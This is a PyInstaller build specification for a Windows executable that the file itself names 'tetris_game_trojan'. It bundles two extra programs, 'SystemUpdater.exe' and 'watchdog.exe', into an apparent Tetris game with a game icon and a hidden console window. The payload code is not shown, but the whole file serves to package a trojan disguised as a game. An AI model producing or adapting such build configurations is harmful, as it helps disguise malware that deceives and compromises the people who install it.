# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['tetris_game_trojan.py'],
    pathex=[],
    binaries=[],
    datas=[('SystemUpdater.exe', '.'), ('watchdog.exe', '.'), ('Sounds', 'Sounds')],
    hiddenimports=['psutil', 'tkinter', 'pywin32', 'pygame', 'game', 'grid', 'blocks', 'block', 'position', 'colors'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='tetris_game_trojan',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=['games_tetris.ico'],
)
